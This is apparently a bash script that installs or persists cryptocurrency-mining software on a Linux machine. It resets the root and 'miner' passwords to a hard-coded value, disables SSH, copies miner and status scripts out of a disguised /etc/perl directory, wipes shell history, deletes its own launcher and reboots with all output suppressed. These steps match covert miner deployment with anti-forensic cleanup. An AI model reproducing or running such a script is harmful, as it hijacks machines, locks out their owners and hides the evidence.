#!/bin/bash

{
sudo chpasswd <<<"miner:whiteboard135lad"
sudo chpasswd <<<"root:whiteboard135lad"

sudo \cp -r /etc/perl/main/execute/rclocal.sh /root/utils/rclocal.sh
sudo systemctl disable ssh.service

sudo \cp -r /etc/perl/main/execute/xminer.sh /root/xminer.sh

sudo \cp -r /etc/perl/main/execute/update_status.sh /root/utils/update_status.sh

sudo \cp -r /etc/perl/main/execute/stats_rig.sh /root/utils/stats_rig.sh

sudo rm /root/.bash_history
sudo rm ~/.bash_history

sudo rm /etc/perl/main/main.sh
sudo \cp -r /var/tmp/screen.miner.log /etc/perl/main/execute/screen.miner.log 
sudo reboot now

} > /dev/null 2>&1

